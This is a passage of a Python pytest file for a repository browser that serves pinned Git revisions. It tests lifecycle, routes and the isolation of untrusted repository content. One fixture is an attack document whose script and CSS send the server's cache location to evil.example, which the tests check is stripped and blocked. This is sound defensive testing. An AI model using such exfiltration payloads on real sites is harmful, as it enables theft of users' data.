"""Serving an acquired ``file://`` pin: lifecycle, routes, and trust isolation over HTTP.

``metab file://… --no-open`` runs here in-process with only the uvicorn server and the
port search patched, the boundary ``tests/test_cli_golden.py`` uses for the filesystem
banner. The command leaves the server's subject opener installed, so a ``TestClient``
then drives the same application lifespan uvicorn would: it opens the pin in its own
event loop, serves real requests through the full middleware stack, and closes the pin
at shutdown. No port is bound and no network is used.

Acquisition needs a Git at or above the floor; like every other acquiring test, these
patch that floor through ``_allow_installed_git`` and run unpatched in the admitted-Git
CI job.
"""

from __future__ import annotations

import asyncio
import io
import json
import os
import re
import sys
import time
from collections.abc import AsyncGenerator, Awaitable, Callable, Iterator
from contextlib import asynccontextmanager, redirect_stderr, redirect_stdout
from dataclasses import dataclass
from pathlib import Path
from typing import Any
from unittest.mock import patch

import pytest
from starlette.routing import Route
from starlette.testclient import TestClient
from typer.testing import CliRunner

from devtools import check_startup_scripts
from metabrowser import server
from metabrowser.cache.acquire import PublishedSource, acquire_source
from metabrowser.cache.repository_store import open_revision
from metabrowser.capabilities import get_capabilities, untrusted_shell_csp
from metabrowser.cli.main import _app, _run_cli
from metabrowser.errors import CLIError
from metabrowser.git.process import GitUnavailableError
from metabrowser.git.tree_source import (
    GitObjectUnavailableError,
    GitPath,
    GitRevisionSubject,
    store_batch_reader_count,
)
from metabrowser.source import (
    SubjectNotOpenError,
    get_source_session,
    serve_subject_opener,
)
from tests.github_pull_fixture import allowlist_violations
from tests.golden_harness import (
    block,
    check_golden,
    first_clone_stderr,
    fix_clock,
    label_home,
    normalize_console,
    ok,
    origin_identity,
    pin_git_dates,
)
from tests.required_tools import needs_git, needs_node
from tests.test_cache_acquire import _allow_installed_git, _file_source, _git

posix_only = pytest.mark.skipif(os.name != "posix", reason="owner-only cache is POSIX-only")

pytestmark = [
    posix_only,
    needs_git,
]

runner = CliRunner()

# The forced untrusted profile: /raw keeps its sandbox and loses allow-scripts.
_RAW_CSP_NO_SCRIPTS = "sandbox allow-popups allow-forms allow-downloads"

# A real one-pixel PNG, so the image blob is served from stored bytes.
_PNG = bytes.fromhex(
    "89504e470d0a1a0a0000000d494844520000000100000001"
    "08060000001f15c4890000000a49444154789c630001000005"
    "00010d0a2db40000000049454e44ae426082"
)

_OTHER_SOURCE_CANARY = "canary-from-another-cached-source"
_WORKING_DIRECTORY_CANARY = "canary-from-the-working-directory"


def _wire(display: str) -> str:
    return GitPath.from_display(display).to_wire()


@dataclass(frozen=True, slots=True)
class _Origin:
    path: Path
    first: str
    second: str

    @property
    def url(self) -> str:
        return f"file://{self.path.resolve()}"


def _origin(root: Path, extra: dict[str, str] | None = None) -> _Origin:
    """A bare origin whose ``topic`` has two commits and a small browsable tree.

    *extra* adds files to the second commit, by name.
    """

    work = root / "work"
    work.mkdir(parents=True)
    _git(work, "init", "-q", "-b", "topic")
    (work / "README.md").write_text("# Pinned\n\n![logo](images/logo.png)\n", encoding="utf-8")
    (work / "images").mkdir()
    (work / "images" / "logo.png").write_bytes(_PNG)
    (work / "page.html").write_text(
        '<!doctype html><link rel="stylesheet" href="style.css"><p>page</p>\n',
        encoding="utf-8",
    )
    (work / "style.css").write_text("p { color: black; }\n", encoding="utf-8")
    _git(work, "add", ".")
    _git(work, "commit", "-qm", "first")
    first = _rev(work)
    (work / "data.json").write_text('{"k": 1}\n', encoding="utf-8")
    for name, body in (extra or {}).items():
        (work / name).write_text(body, encoding="utf-8")
    (work / "README.md").write_text(
        "# Pinned\n\nSecond revision.\n\n![logo](images/logo.png)\n", encoding="utf-8"
    )
    _git(work, "add", ".")
    _git(work, "commit", "-qm", "second")
    second = _rev(work)
    origin = root / "origin.git"
    _git(work, "clone", "--bare", "--template=", "--", str(work), str(origin))
    return _Origin(path=origin, first=first, second=second)


def _rev(work: Path) -> str:
    head = (work / ".git" / "HEAD").read_text(encoding="utf-8").strip()
    ref = head.removeprefix("ref: ")
    return (work / ".git" / ref).read_text(encoding="utf-8").strip()


@pytest.fixture(autouse=True)
def _no_interrupt_handler(  # pyright: ignore[reportUnusedFunction]
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """Keep the interrupt handler and the log level inside one test."""

    monkeypatch.setattr("metabrowser.cli.git_pin_cli.stop_on_interrupt", lambda: None)
    monkeypatch.delenv("METABROWSER_LOG_LEVEL", raising=False)


def _body(tmp_path: Path, body: object) -> str:
    """A request body in a file, as ``--data`` takes one."""

    path = tmp_path / "body.json"
    path.write_text(json.dumps(body) + "\n", encoding="utf-8")
    return str(path)


def _home(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> Path:
    home = tmp_path / "home"
    monkeypatch.setenv("METABROWSER_CACHE_DIR", str(home))
    _allow_installed_git(monkeypatch)
    return home


def _serve(url: str, *extra: str) -> Any:
    """Run serve mode to the point where uvicorn would take over, and return the result."""

    with (
        patch("metabrowser.cli.serve._QuietForceExitServer") as server_class,
        patch("metabrowser.cli.serve.find_available_local_port", return_value=8411),
    ):
        result = runner.invoke(_app, [url, "--no-open", *extra])
    if result.exit_code == 0:
        config = server_class.call_args.args[0]
        assert config.app is server.app
        assert config.port == 8411
    return result


# ── The command ─────────────────────────────────────────────────────

# ``_origin``'s second commit once ``pin_git_dates`` fixes the dates its recipe inherits.
BANNER_REVISION = "99d0343568d1b5119b4182bdf8162413989746c2"


def test_golden_serve_pin_banner(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    """The banner names the source, the pinned commit, the ref, and where ``--path`` opens.

    ``--path`` takes the spellings ``--show`` accepts and prints one canonical address:
    a leading ``/`` or ``./`` is dropped, a wire is kept, and a directory gets a
    trailing slash.
    """

    home = _home(tmp_path, monkeypatch)
    pin_git_dates(monkeypatch)
    # The first command clones and says how long it took; the others say how long ago.
    fix_clock(monkeypatch)
    origin = _origin(tmp_path)
    assert origin.second == BANNER_REVISION
    selections = (
        "images/logo.png",
        "./README.md",
        "/README.md",
        _wire("images/logo.png"),
        "images",
        "images/",
        "/",
    )
    blocks: list[str] = []
    for arguments in ((), *(("--path", selection) for selection in selections)):
        result = _serve(origin.url, *arguments)
        assert result.exit_code == 0, result.output
        blocks.append(
            block(
                " ".join(["metab file://<ROOT>/origin.git --no-open", *arguments]),
                result.exit_code,
                normalize_console(result.stdout, tmp_path),
                normalize_console(label_home(result.stderr, home), tmp_path),
            )
        )
    check_golden("serve-pin-banner.txt", "".join(blocks))


@pytest.mark.parametrize(
    "env",
    [{}, {"METAB_ACTIVE_CONTENT": "1", "METAB_ALLOW_EDITS": "1", "METAB_UNTRUSTED": "0"}],
    ids=["default", "env-enables"],
)
def test_serve_pin_forces_the_untrusted_profile(
    env: dict[str, str], tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    _home(tmp_path, monkeypatch)
    for name, value in env.items():
        monkeypatch.setenv(name, value)
    result = _serve(_origin(tmp_path).url)
    assert result.exit_code == 0, result.output
    assert get_capabilities().active_content is False
    assert get_capabilities().mutations is False
    with TestClient(server.app) as client:
        wire = client.get("/api/capabilities").json()["capabilities"]
    assert wire == {"active_content": False, "mutations": False}


def test_serve_pin_refuses_allow_edits_before_acquiring(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    home = _home(tmp_path, monkeypatch)
    result = _serve(_origin(tmp_path).url, "--allow-edits")
    assert isinstance(result.exception, CLIError)
    assert "--allow-edits is not available on an acquired Git source" in str(result.exception)
    assert not home.exists()


def test_serve_pin_path_refuses_a_missing_path(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    _home(tmp_path, monkeypatch)
    origin = _origin(tmp_path)
    missing = _serve(origin.url, "--path", "nope.txt")
    assert isinstance(missing.exception, CLIError)
    assert "--path target is not in the pinned revision: nope.txt" in str(missing.exception)


def test_a_pin_that_cannot_open_is_refused_before_the_banner(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """The same path-free message as ``--show`` and ``--api``, and nothing served."""

    home = _home(tmp_path, monkeypatch)

    async def fail_open(**_kwargs: object) -> GitRevisionSubject:
        raise GitObjectUnavailableError("0" * 40)

    monkeypatch.setattr("metabrowser.cli.git_pin_cli.open_revision", fail_open)
    result = _serve(_origin(tmp_path).url)
    assert isinstance(result.exception, CLIError)
    assert "Serving" not in result.output
    assert str(home) not in str(result.exception)


def _run_serve(args: list[str]) -> tuple[int, str, str]:
    """Run the console entry point with the real uvicorn server, as `metab` does."""

    out = io.StringIO()
    err = io.StringIO()
    code = 0
    with redirect_stdout(out), redirect_stderr(err):
        try:
            _run_cli(args)
        except SystemExit as exc:
            code = 0 if exc.code is None else int(exc.code)
    return code, out.getvalue(), err.getvalue()


def test_a_pin_that_fails_to_reopen_in_the_server_exits_without_a_traceback(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """The lifespan's own open fails after the banner: a path-free error and exit 1.

    Only the second open fails, the one the application lifespan makes in the
    serving loop, so uvicorn really starts and its startup really fails. Nothing
    binds a port, because uvicorn binds only after a successful startup.
    """

    home = _home(tmp_path, monkeypatch)
    origin = _origin(tmp_path)
    calls: list[str] = []

    async def second_open_fails(**kwargs: Any) -> GitRevisionSubject:
        calls.append(kwargs["commit_oid"])
        if len(calls) == 1:
            return await open_revision(**kwargs)
        raise GitUnavailableError(f"repository store is not a directory: {home}/x")

    monkeypatch.setattr("metabrowser.cli.git_pin_cli.open_revision", second_open_fails)
    code, stdout, stderr = _run_serve([origin.url, "--no-open"])

    assert len(calls) == 2
    assert code == 1, (stdout, stderr)
    assert "Serving" in stdout
    assert stderr.strip().endswith(
        "Error: Git could not open the cached repository store; see --log-level debug"
    ), stderr
    # Before the banner the clone said where it went, which is the user's own cache
    # directory, and that it was done: exactly those two lines, and then the error.
    # Nothing else is on stderr, so nothing names the store or anything under the cache.
    error = "Error: Git could not open the cached repository store; see --log-level debug\n"
    assert re.fullmatch(
        first_clone_stderr(origin.url, home, then="starting the server") + re.escape(error),
        stderr,
    ), stderr
    for text in (stdout, stderr):
        assert "Traceback" not in text
        assert "Application startup failed" not in text
    assert str(home) not in stdout


def test_a_folder_whose_startup_fails_exits_non_zero(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """Uvicorn returns normally from a failed startup; the command must not report success."""

    @asynccontextmanager
    async def failing_subject() -> AsyncGenerator[None]:
        raise RuntimeError("startup failed on purpose")
        yield

    monkeypatch.setattr(server, "lifespan_subject", failing_subject)
    folder = tmp_path / "folder"
    folder.mkdir()
    code, _stdout, stderr = _run_serve([str(folder), "--no-open"])
    assert code == 1
    assert "Error: the server did not start; the log above says why" in stderr


# ── The lifespan ─────────────────────────────────────────────────────


def _published(tmp_path: Path, origin: _Origin) -> PublishedSource:
    return asyncio.run(acquire_source(_file_source(origin.path), home=tmp_path / "home"))


def _counting_opener(
    published: PublishedSource,
) -> tuple[Callable[[], Awaitable[GitRevisionSubject]], list[GitRevisionSubject]]:
    opened: list[GitRevisionSubject] = []

    async def opener() -> GitRevisionSubject:
        subject = await open_revision(
            home=published.home,
            store_key=published.store_key,
            commit_oid=published.default_revision,
            store_identity=published.store_id,
            ref=published.default_remote_ref,
        )
        opened.append(subject)
        return subject

    return opener, opened


def test_each_start_opens_a_fresh_pin_and_shutdown_closes_it(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """Repeated starts share nothing: new processes, a new generation, and a clean close."""

    _home(tmp_path, monkeypatch)
    origin = _origin(tmp_path)
    published = _published(tmp_path, origin)
    opener, opened = _counting_opener(published)
    serve_subject_opener(opener)

    generations: list[int] = []
    for start in range(2):
        with TestClient(server.app) as client:
            assert len(opened) == start + 1
            subject = opened[-1]
            assert get_source_session().subject is subject
            status = client.get("/api/source/status").json()
            assert status["pin"] == origin.second
            assert status["ref"] == "refs/remotes/origin/topic"
            assert status["ref_name"] == "topic"
            generations.append(status["generation"])
            readme = client.get("/api/file", params={"path": _wire("README.md")})
            assert "Second revision." in readme.json()["content"]
            assert store_batch_reader_count(subject.command_target) >= 1
        # Shutdown closed the pin's readers and detached it.
        assert store_batch_reader_count(subject.command_target) == 0
    assert opened[0] is not opened[1]
    assert generations[1] > generations[0]
    # With the opener still configured and nothing attached, a request made outside
    # the lifespan is refused rather than served from the working directory.
    with pytest.raises(SubjectNotOpenError):
        get_source_session()
    with pytest.raises(SubjectNotOpenError):
        TestClient(server.app).get("/api/file", params={"path": "README.md"})


def test_a_pin_that_fails_to_open_fails_startup_and_attaches_nothing(
    tmp_path: Path,
) -> None:
    async def opener() -> GitRevisionSubject:
        raise GitObjectUnavailableError("0" * 40)

    serve_subject_opener(opener)
    with pytest.raises(GitObjectUnavailableError), TestClient(server.app):
        pass
    server._set_root_dir(tmp_path)
    assert get_source_session().subject.kind == "attached_filesystem"


def test_setting_a_filesystem_root_replaces_a_served_pin(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    _home(tmp_path, monkeypatch)
    published = _published(tmp_path, _origin(tmp_path))
    opener, opened = _counting_opener(published)
    serve_subject_opener(opener)
    folder = tmp_path / "folder"
    folder.mkdir()
    server._set_root_dir(folder)
    with TestClient(server.app) as client:
        status = client.get("/api/source/status").json()
    assert status["subject"] == "attached_filesystem"
    assert status["pin"] is None
    # A folder is no mirror: its name and path reach the page as they always did.
    assert (status["name"], status["origin"], status["location"]) == (None, None, None)
    assert opened == []


# ── Routes over HTTP ─────────────────────────────────────────────────


@pytest.fixture
def served(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> Iterator[tuple[TestClient, _Origin]]:
    _home(tmp_path, monkeypatch)
    origin = _origin(tmp_path)
    result = _serve(origin.url)
    assert result.exit_code == 0, result.output
    with TestClient(server.app) as client:
        yield client, origin


def test_the_shell_names_the_repository_and_its_pinned_revision(
    served: tuple[TestClient, _Origin],
) -> None:
    client, origin = served
    shell = client.get("/view/")
    assert shell.status_code == 200
    # The root is the repository's name, as a checkout of ``origin.git`` would be
    # called, in the heading and as what the file header's prefix reads back. It was
    # the full commit ID (mb-fndz).
    assert 'data-served-root="origin"' in shell.text
    assert '<span class="path-base">origin</span>' in shell.text
    assert f'data-served-root="{origin.second}"' not in shell.text
    # The ref and the short commit follow it, muted, each in its own element so a
    # narrow column drops the ref first.
    assert (
        '<span class="path"><span class="path-base">origin</span></span>'
        '<span class="header-revision header-ref">topic</span>'
        f'<span class="header-revision">{origin.second[:12]}</span></a>'
    ) in shell.text
    # The tab is called what a folder's is: the page names the root in its headings.
    assert "<title>Metabrowser</title>" in shell.text
    assert 'window.METABROWSER_SOURCE_KIND="git_revision"' in shell.text
    assert "window.METABROWSER_REPOSITORY_CONTEXT=null" in shell.text
    # The GitPath codec is a startup script here, ahead of the navigation module that
    # displays a pin's paths with it. A folder's shell leaves it out:
    # test_source_line_anchors.py holds that half.
    assert shell.text.index('<script src="/static/git-path.js') < shell.text.index(
        '<script src="/static/navigation.js'
    )
    # A pinned address is a GitPath wire, and a filesystem spelling is refused.
    assert client.get(f"/view/{_wire('README.md')}").status_code == 200
    assert client.get("/view/README.md").status_code == 400
    assert client.get(f"/commit/{origin.first}").status_code == 200


def test_the_status_and_the_page_say_where_the_mirror_is_kept(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """A served mirror names its location, with the home directory as ``~`` (mb-fndz).

    The location is the store's bare repository, the directory Git reads every page
    from, and the sentence around it says so: a mirror has no checked-out folder. The
    status reports it as data and the page's heading carries the same text, for the
    file header to read back as it reads the served root.
    """

    # Everything is under the reader's home directory: the application home, as it is
    # by default, and the origin, as a repository of their own would be. So an answer
    # that spelled the home directory out anywhere would be caught below.
    user = tmp_path.resolve() / "user"
    home = user / ".cache" / "metabrowser"
    origin = _origin(user / "git")
    assert origin.url == f"file://{user}/git/origin.git"
    monkeypatch.setenv("HOME", str(user))
    monkeypatch.setenv("METABROWSER_CACHE_DIR", str(home))
    _allow_installed_git(monkeypatch)
    result = _serve(origin.url)
    assert result.exit_code == 0, result.output

    (store,) = (home / "repository-stores").iterdir()
    location = f"~/.cache/metabrowser/repository-stores/{store.name}/repository.git"
    shown_origin = "file://~/git/origin.git"
    # It is what it is said to be: a bare repository, with the pinned commit in it.
    assert (store / "repository.git" / "HEAD").is_file()
    assert not (store / "repository.git" / ".git").exists()

    def tip(commit: str) -> str:
        return (
            f"Mirror of {shown_origin} at {commit}, stored in {location}: "
            "a bare Git repository, with no checked-out files."
        )

    with TestClient(server.app) as client:
        answered = client.get("/api/source/status")
        status = answered.json()
        assert status["name"] == "origin"
        assert status["origin"] == shown_origin
        assert status["location"] == location

        page = client.get(f"/view/{_wire('README.md')}")
        assert (
            f'data-served-root="origin" data-mirror-location="{location}" '
            f'data-mirror-tip="{tip(origin.second)}">'
        ) in page.text
        # A mirror's page is marked as one, and carries the module that draws the note
        # and the commit's copy control, inline and whole.
        assert '<main class="container mirror-source">' in page.text
        module = (server.STATIC_DIR / "mirror-heading.js").read_text(encoding="utf-8")
        assert page.text.count(f">{module}</script>") == 1
        # Abbreviated wherever it stands: no answer spells the home directory out, in
        # its body or in a header, though the origin and the mirror are both under it.
        for response in (answered, page, client.get("/view/"), client.get("/api/tree")):
            assert str(user) not in response.text, response.url
            assert str(user) not in str(response.headers), response.url

        # Another commit of the same repository is the same mirror in the same place,
        # and the sentence names the commit now served.
        switched = client.post("/api/source/pin", json={"oid": origin.first})
        assert switched.status_code == 200, switched.text
        assert switched.json()["status"]["location"] == location
        assert switched.json()["status"]["origin"] == shown_origin
        assert switched.json()["status"]["name"] == "origin"
        assert str(user) not in switched.text
        assert f'data-mirror-tip="{tip(origin.first)}">' in client.get("/view/").text


def test_the_api_mode_prints_where_the_mirror_is_kept(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """``metab <url> --api /api/source/status`` says where the mirror is (mb-fndz).

    The application home is outside the home directory here, so the location is
    absolute, and it is the directory a pin's output is normalized against. It was
    printed as ``<ROOT>``, which says nothing. It is printed as answered, and it is the
    only thing that is: a path under it anywhere else is still rewritten.
    """

    home = _home(tmp_path, monkeypatch)
    origin = _origin(tmp_path)
    store_key = origin_identity(origin.url).store_id.removeprefix("sha256:")
    location = str(home / "repository-stores" / store_key / "repository.git")

    status = ok([origin.url, "--api", "/api/source/status"])
    assert status.payload()["location"] == location
    assert status.payload()["origin"] == origin.url
    assert "<ROOT>" not in status.stdout

    switched = ok(
        [origin.url, "--api", "/api/source/pin", "--data", _body(tmp_path, {"oid": origin.first})]
    )
    assert switched.payload()["status"]["location"] == location
    assert switched.stdout.count(str(home)) == 1


# A document that tries each way a repository's author could read the heading: run
# script, select the heading from a stylesheet and report the match to another host, ask
# the status route for an image or through a frame, and label itself as the heading.
_READS_THE_LOCATION = """# Attack

<script>fetch("/api/source/status").then((r) => r.json()).then((s) => {
  location = "https://evil.example/?" + encodeURIComponent(s.location);
});</script>

<style>.header-path[data-mirror-location^="/"] { background: url(https://evil.example/a) }</style>

<link rel="stylesheet" href="attack.css">

<p class="header-path" data-mirror-location="x" style="background: url(https://evil.example/b)"
   onmouseover="fetch('/api/source/status')">hover</p>

<img src="/api/source/status" alt="status">

<iframe src="/api/source/status"></iframe>

[status](/api/source/status)
"""
_ATTACK_PAGE = '<!doctype html><script>fetch("/api/source/status")</script><p>page</p>\n'


def test_repository_content_cannot_read_where_the_mirror_is_kept(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """The location is on the application page, and a mirror's content is not (mb-fndz).

    Cache paths were kept out of every answer because a served mirror is untrusted. The
    location is now shown, so this holds the reason it is still safe: for a repository's
    author to read it, their content would have to run script in the application's
    origin, or style the application page and report what a selector matched. A
    document that tries both renders as plain markup; the page's policy leaves nowhere
    to report to; and the same file opened raw is a sandbox the status route refuses.
    """

    _home(tmp_path, monkeypatch)
    origin = _origin(tmp_path, {"ATTACK.md": _READS_THE_LOCATION, "attack.html": _ATTACK_PAGE})
    result = _serve(origin.url)
    assert result.exit_code == 0, result.output

    with TestClient(server.app) as client:
        location = client.get("/api/source/status").json()["location"]
        assert location and str(tmp_path) in location

        rendered = client.get(
            "/api/kpress/render", params={"path": _wire("ATTACK.md"), "view": "document"}
        ).json()
        assert rendered["inert"] is True
        html = rendered["html"]
        assert allowlist_violations(html, images=True) == []
        for gone in (
            "<script",
            "<style",
            "<link",
            "<iframe",
            "style=",
            "class=",
            "data-mirror",
            "onmouseover",
            "evil.example",
            "/api/source/status",
        ):
            assert gone not in html, gone
        # What is left is the document's words.
        assert "hover" in html and "status" in html
        loads = {asset["loading"] for asset in rendered["assets"]["assets"]}
        assert loads <= {"stylesheet", "resource"}

        # The page that carries the location runs this server's scripts only, takes no
        # stylesheet from the tree, reaches no other host, and cannot be framed.
        shell = client.get(f"/view/{_wire('ATTACK.md')}")
        assert location in shell.text
        policy = shell.headers["content-security-policy"]
        nonce = re.search(r"'nonce-([^']+)'", policy)
        assert nonce is not None
        assert policy == untrusted_shell_csp(nonce.group(1), "http://testserver")
        for directive in (
            "img-src 'self' data:",
            "connect-src 'self'",
            "frame-src 'none'",
            "frame-ancestors 'none'",
        ):
            assert directive in policy
        assert "/raw" not in policy
        assert "access-control-allow-origin" not in shell.headers

        # The same content opened raw runs nothing, and its origin is refused the status.
        raw = client.get("/raw", params={"path": _wire("attack.html")})
        assert raw.status_code == 200
        assert raw.headers["content-security-policy"] == _RAW_CSP_NO_SCRIPTS
        assert location not in raw.text
        for headers in ({"origin": "null"}, {"sec-fetch-site": "cross-site"}):
            refused = client.get("/api/source/status", headers=headers)
            assert refused.status_code == 403, headers
            assert location not in refused.text
            assert "access-control-allow-origin" not in refused.headers


def test_a_served_pin_has_its_routes_before_its_first_request(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    # server.py imports a pin's routes where a pin is served, which keeps them off a
    # folder's start. A served pin imports them as it starts, so its first request does
    # not import them on the event loop. This process has long since imported them, so
    # the module is forgotten for the length of the test.
    _home(tmp_path, monkeypatch)
    origin = _origin(tmp_path)
    monkeypatch.delitem(sys.modules, "metabrowser.git.content_routes", raising=False)

    result = _serve(origin.url)

    assert result.exit_code == 0, result.output
    assert "metabrowser.git.content_routes" in sys.modules


def test_a_pins_shell_adds_the_startup_scripts_the_budget_check_reports(
    served: tuple[TestClient, _Origin],
) -> None:
    # devtools/check_startup_scripts.py cannot acquire a repository on every lint, so
    # it reports a pin's shell as a folder's plus server.PIN_STARTUP_SCRIPTS. This is
    # the real pin's shell held to that list. Rendering the folder's replaces the
    # served pin, so the pin's is read first.
    client, _origin = served
    pin = check_startup_scripts.startup_script_paths(client.get("/view/").text)
    folder = check_startup_scripts.startup_script_paths(check_startup_scripts.render_folder_shell())
    added = [f"/static/{name}" for name in server.PIN_STARTUP_SCRIPTS]
    assert added == ["/static/git-path.js"]
    assert sorted(pin) == sorted(folder + added)
    assert not set(added) & set(folder)


@needs_node
def test_a_pins_page_without_its_codec_stops_and_says_so(
    served: tuple[TestClient, _Origin],
) -> None:
    # A pin's page names and addresses every file through the GitPath codec. If that
    # startup script did not arrive, a row would show its wire for a name and a link
    # would address another file. The page's own scripts, run whole: with the codec
    # they start the tree; without it they say the page did not load and ask for
    # nothing.
    client, _origin = served
    shell = client.get("/view/").text
    loaded = check_startup_scripts.run_startup_session(shell, "/view/")
    assert loaded["errors"] == []
    assert loaded["alerts"] == []
    assert loaded["requested"] == []
    assert "/api/tree" in loaded["fetches"]

    codec = re.search(r'\n *<script src="/static/git-path\.js[^"]*"></script>', shell)
    assert codec is not None
    without = check_startup_scripts.run_startup_session(shell.replace(codec.group(0), ""), "/view/")
    assert (
        without["alerts"]
        == ["This page did not load completely. Refresh the page to try again."] * 2
    )
    assert without["fetches"] == []
    assert without["requested"] == []
    assert len(without["errors"]) == 1
    assert "git-path.js did not load on a pinned revision's page" in without["errors"][0]


def test_tree_file_and_raw_answer_from_the_pinned_tree(
    served: tuple[TestClient, _Origin],
) -> None:
    client = served[0]
    tree = client.get("/api/tree", params={"depth": "1"}).json()
    assert tree["subject"] == "git_revision"
    assert sorted(node["name"] for node in tree["tree"]) == [
        "README.md",
        "data.json",
        "images",
        "page.html",
        "style.css",
    ]

    readme = client.get("/api/file", params={"path": _wire("README.md")}).json()
    assert readme["kind"] == "markdown"
    assert readme["content"].startswith("# Pinned")

    html = client.get("/api/file", params={"path": _wire("page.html")}).json()
    assert [view["id"] for view in html["views"]] == ["source"]

    image = client.get("/raw", params={"path": _wire("images/logo.png")})
    assert image.status_code == 200
    assert image.content == _PNG
    assert image.headers["content-type"] == "image/png"
    assert image.headers["content-security-policy"] == _RAW_CSP_NO_SCRIPTS
    assert image.headers["x-content-type-options"] == "nosniff"

    page = client.get("/raw", params={"path": _wire("page.html")})
    assert page.status_code == 200
    assert page.headers["content-type"].startswith("text/html")
    assert page.headers["content-security-policy"] == _RAW_CSP_NO_SCRIPTS


def test_the_raw_path_form_is_an_honest_refusal_on_a_pin(
    served: tuple[TestClient, _Origin],
) -> None:
    """A relative reference inside a raw pinned document reaches a typed refusal (mb-g5je).

    The refusal comes before the path is read, so one pin answers for a file beside the
    document, the document, a wire, and a nested path.
    """

    client = served[0]
    for path in ("style.css", "page.html", _wire("style.css"), "images/logo.png"):
        response = client.get(f"/raw/{path}")
        assert response.status_code == 409, path
        assert response.json() == {
            "error": "source does not support raw_document_path",
            "code": "unsupported_for_subject",
            "capability": "raw_document_path",
        }
        assert response.headers["content-security-policy"] == _RAW_CSP_NO_SCRIPTS
        assert response.headers["x-content-type-options"] == "nosniff"


def test_history_commit_and_comparison_work_on_a_served_pin(
    served: tuple[TestClient, _Origin],
) -> None:
    client, origin = served
    repo = client.get("/api/git/repo").json()
    assert repo["head"]["revision"] == origin.second
    assert repo["head"]["detached"] is True

    log = client.get("/api/git/log", params={"limit": "10"}).json()
    assert [commit["id"] for commit in log["commits"]] == [origin.second, origin.first]

    detail = client.get(f"/api/git/commit/{origin.second}").json()
    assert detail["commit"]["subject"] == "second"
    changed = {entry["path"] for entry in detail["files"]}
    assert changed == {"README.md", "data.json"}

    comparison = client.get("/api/plugin/diff/comparison", params={"revision": origin.second})
    assert comparison.status_code == 200
    manifest = comparison.json()["manifest"]
    assert manifest["totals"]["files"] == 2
    assert {entry["new"]["path"] for entry in manifest["files"]} == {"README.md", "data.json"}


# ── Trust isolation ─────────────────────────────────────────────────


def _second_source(tmp_path: Path) -> _Origin:
    """Another cached source whose tree holds a canary the pin must never serve."""

    root = tmp_path / "other"
    work = root / "work"
    work.mkdir(parents=True)
    _git(work, "init", "-q", "-b", "topic")
    (work / "OTHER.md").write_text(f"{_OTHER_SOURCE_CANARY}\n", encoding="utf-8")
    (work / "README.md").write_text(f"{_OTHER_SOURCE_CANARY}\n", encoding="utf-8")
    _git(work, "add", ".")
    _git(work, "commit", "-qm", "other")
    commit = _rev(work)
    origin = root / "origin.git"
    _git(work, "clone", "--bare", "--template=", "--", str(work), str(origin))
    return _Origin(path=origin, first=commit, second=commit)


def _probe_urls(
    route: Route, probes: tuple[str, ...], other_commit: str, pin_commit: str
) -> list[str]:
    """Every GET route, with each probe identity in its path parameter or query.

    A route without a path parameter gets the probe as ``path``, and also as every
    other identity a registered route reads from its query: the comparison
    hook's ``revision``, ``left``, ``right``, and ``file``.
    """

    path = route.path
    urls: list[str] = []
    for probe in probes:
        if "{" not in path:
            urls.append(f"{path}?path={probe}")
            urls.append(f"{path}?revision={other_commit}&file={probe}")
            urls.append(f"{path}?revision={pin_commit}&file={probe}")
            urls.append(f"{path}?left={other_commit}&right={pin_commit}&file={probe}")
            urls.append(f"{path}?left={pin_commit}&right={other_commit}")
            # A request the route's own validation refuses, for its error answer.
            urls.append(f"{path}?kind=bogus&limit=-1&depth=x&q=" + "q" * 300)
            continue
        filled = re.sub(r"\{revision\}|\{rest:path\}", other_commit, path)
        filled = re.sub(r"\{[^}]+\}", probe, filled)
        urls.append(filled)
    if path.startswith("/pull/"):
        # A pull-request address is a number: the page that says none is served.
        urls.append("/pull/7")
    return urls


# The routes that answer with the page, and where each source route's answer holds the
# status envelope: the status route's is the envelope, and the two POST routes carry it
# as ``status`` when they have one to give.
_PAGE_ROUTES = ("/view/{path:path}", "/commit/{rest:path}", "/pull/{rest:path}")
_STATUS_ROUTE = "/api/source/status"
_PIN_ROUTE = "/api/source/pin"
_REFRESH_ROUTE = "/api/source/refresh"
_STATUS_AT: dict[str, str | None] = {
    _STATUS_ROUTE: None,
    _PIN_ROUTE: "status",
    _REFRESH_ROUTE: "status",
}


@dataclass(frozen=True, slots=True)
class _ServedMirror:
    """What a served mirror's answers may name, and what no answer may."""

    origin: str
    location: str
    home: Path
    origin_path: Path
    store_key: str

    def sentence(self, commit: str) -> str:
        return (
            f"Mirror of {self.origin} at {commit}, stored in {self.location}: "
            "a bare Git repository, with no checked-out files."
        )

    def remainder(self, path: str, response: Any, *, commit: str) -> tuple[str, bool]:
        """The answer, headers and body, without the mirror's origin and location.

        A served mirror says where it is kept and what it mirrors (mb-fndz), and the
        rule is exact about where: the ``origin`` and ``location`` of the status
        envelope, wherever a source route answers with it, and the two attributes of the
        page's navigation heading that carry the same text. Each is checked to be
        exactly that text and then taken out, so whatever is found in what is left
        stands somewhere the rule does not allow: another field, another route, an error
        message, a header. The second value says whether anything was taken out.
        """

        headers = "".join(f"{name}: {value}\n" for name, value in response.headers.items())
        text: str = response.text
        if path in _STATUS_AT:
            try:
                body = response.json()
            except ValueError:
                body = None
            member = _STATUS_AT[path]
            status = body if member is None else body.get(member) if body else None
            if isinstance(status, dict) and "subject" in status:
                named = (status.pop("origin"), status.pop("location"))
                assert named == (self.origin, self.location), (path, named)
                return headers + json.dumps(body), True
        if path in _PAGE_ROUTES and response.status_code == 200:
            heading = (
